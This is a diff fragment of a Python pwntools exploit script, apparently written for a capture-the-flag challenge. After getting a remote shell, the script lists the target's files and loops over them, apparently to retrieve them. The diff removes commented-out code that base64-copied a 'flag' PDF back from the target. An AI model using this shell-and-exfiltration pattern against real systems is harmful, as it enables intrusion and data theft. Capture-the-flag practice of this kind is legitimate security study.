@@ -25,13 +25,6 @@ p.sendline(b"/bin/sh")
 p.clean()
 
 p.sendline("ls")
-# list_files = p.clean().decode().split("\n")
-# p.sendline(f"base64 {'whispers_in_the_dark.pdf'}".encode())
-# encoded_file = p.clean().decode()
-# with open('flag_retrieved.pdf', "wb") as f:
-#     f.write(b64d(encoded_file))
-
-
 
 files = p.clean().decode().strip().split("\n")
 for file in files:
